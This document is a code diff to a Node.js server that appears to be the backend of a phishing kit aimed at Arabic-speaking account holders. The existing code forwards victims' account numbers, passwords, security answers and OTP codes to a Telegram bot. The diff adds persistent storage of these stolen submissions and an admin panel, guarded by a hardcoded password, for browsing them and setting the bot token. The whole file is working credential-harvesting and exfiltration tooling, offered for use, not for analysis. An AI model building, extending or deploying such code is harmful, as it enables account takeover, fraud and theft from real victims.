@@ -6,6 +6,35 @@ const https = require("https");
 const PORT = process.env.PORT || 3000;
 const SETTINGS_FILE = path.join(__dirname, "settings.json");
 const ADMIN_PASSWORD = "Admin1234";
+const SUBMISSIONS_FILE = path.join(__dirname, "submissions.json");
+
+// In-memory submissions storage
+let submissions = [];
+try {
+  if (fs.existsSync(SUBMISSIONS_FILE)) {
+    submissions = JSON.parse(fs.readFileSync(SUBMISSIONS_FILE, "utf-8"));
+  }
+} catch (e) {}
+
+function saveSubmissions() {
+  try { fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2)); } catch (e) {}
+}
+
+function addSubmission(type, data) {
+  const entry = {
+    id: Date.now() + "_" + Math.random().toString(36).slice(2, 8),
+    type,
+    account: data.account || "",
+    time: new Date().toISOString(),
+    data: { ...data }
+  };
+  submissions.unshift(entry);
+  if (submissions.length > 500) submissions = submissions.slice(0, 500);
+  saveSubmissions();
+  return entry;
+}
+
+const adminSessions = new Set();
 
 const MIME = {
   ".html": "text/html; charset=utf-8",
@@ -115,18 +144,56 @@ function detectAndSend(data) {
   const s = loadSettings();
   const time = new Date().toLocaleString("ar-EG");
   if (data.password) {
+    addSubmission("login", data);
     const msg = `🔐 <b>تسجيل دخول جديد</b>\n\n👤 رقم الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || "غير محدد"}\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
   if (data.question || data.answer) {
+    addSubmission("security", data);
     const msg = `🛡️ <b>سؤال أمان</b>\n\n❓ السؤال: ${data.question || ""}\n✏️ الجواب: <code>${data.answer || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
   if (data.code || data.otp || data.otp_code) {
+    addSubmission("otp", data);
     const msg = `🔢 <b>رمز OTP</b>\n\n🔑 الرمز: <code>${data.code || data.otp || data.otp_code || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
   return Promise.resolve(true);
+}
+
+function parseCookies(req) {
+  const cookies = {};
+  (req.headers.cookie || "").split(";").forEach(c => {
+    const [k, v] = c.trim().split("=");
+    if (k) cookies[k] = v;
+  });
+  return cookies;
+}
+
+function isAdminLoggedIn(req) {
+  const cookies = parseCookies(req);
+  return cookies.admin_session && adminSessions.has(cookies.admin_session);
+}
+
+function sendHtml(res, filePath) {
+  fs.readFile(filePath, (err, data) => {
+    if (err) { res.writeHead(500); res.end("Error"); return; }
+    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+    res.end(data);
+  });
+}
+
+function sendJsonApi(res, code, obj) {
+  res.writeHead(code, { "Content-Type": "application/json", "Cache-Control": "no-store" });
+  res.end(JSON.stringify(obj));
+}
+
+function readJsonBody(req) {
+  return new Promise((resolve) => {
+    let body = "";
+    req.on("data", (c) => (body += c));
+    req.on("end", () => { try { resolve(JSON.parse(body)); } catch { resolve({}); } });
+  });
 }
 
 const SERVER_FN_HANDLERS = {
@@ -183,6 +250,86 @@ const SERVER_FN_HANDLERS = {
 
 http.createServer(async (req, res) => {
   const urlPath = decodeURIComponent(req.url.split("?")[0]);
+
+  // Admin routes
+  if (urlPath === "/admin-login" || urlPath === "/admin-login.html") {
+    return sendHtml(res, path.join(__dirname, "admin-login.html"));
+  }
+
+  if (urlPath === "/admin-panel" || urlPath === "/admin-panel.html") {
+    if (!isAdminLoggedIn(req)) {
+      res.writeHead(302, { Location: "/admin-login" });
+      return res.end();
+    }
+    return sendHtml(res, path.join(__dirname, "admin-panel.html"));
+  }
+
+  if (urlPath === "/admin/login" && req.method === "POST") {
+    const body = await readJsonBody(req);
+    if (body.password === ADMIN_PASSWORD) {
+      const token = Date.now().toString(36) + Math.random().toString(36).slice(2);
+      adminSessions.add(token);
+      res.writeHead(200, {
+        "Content-Type": "application/json",
+        "Set-Cookie": `admin_session=${token}; HttpOnly; Path=/`
+      });
+      return res.end(JSON.stringify({ ok: true }));
+    }
+    return sendJsonApi(res, 401, { ok: false, error: "كلمة المرور غير صحيحة" });
+  }
+
+  if (urlPath === "/admin/logout") {
+    const cookies = parseCookies(req);
+    if (cookies.admin_session) adminSessions.delete(cookies.admin_session);
+    res.writeHead(302, {
+      Location: "/admin-login",
+      "Set-Cookie": "admin_session=; HttpOnly; Path=/; Max-Age=0"
+    });
+    return res.end();
+  }
+
+  if (urlPath === "/admin/api/submissions" && req.method === "GET") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    return sendJsonApi(res, 200, { ok: true, submissions });
+  }
+
+  if (urlPath === "/admin/api/delete" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const body = await readJsonBody(req);
+    if (body.id) {
+      submissions = submissions.filter(s => s.id !== body.id);
+      saveSubmissions();
+    }
+    return sendJsonApi(res, 200, { ok: true });
+  }
+
+  if (urlPath === "/admin/api/clear" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    submissions = [];
+    saveSubmissions();
+    return sendJsonApi(res, 200, { ok: true });
+  }
+
+  if (urlPath === "/admin/api/settings" && req.method === "GET") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const s = loadSettings();
+    return sendJsonApi(res, 200, { ok: true, bot_token: s.bot_token, chat_id: s.chat_id });
+  }
+
+  if (urlPath === "/admin/api/settings" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const body = await readJsonBody(req);
+    const s = { bot_token: body.bot_token || "", chat_id: body.chat_id || "", updated_at: new Date().toISOString() };
+    saveSettings(s);
+    return sendJsonApi(res, 200, { ok: true });
+  }
+
+  if (urlPath === "/admin/api/test-bot" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const s = loadSettings();
+    const sent = await sendTelegram(s.bot_token, s.chat_id, "✅ رسالة اختبار — البوت يعمل بنجاح!");
+    return sendJsonApi(res, 200, sent ? { ok: true } : { ok: false, error: "فشل الإرسال" });
+  }
 
   if (urlPath.startsWith("/_serverFn/") && req.method === "POST") {
     const hash = urlPath.replace("/_serverFn/", "");
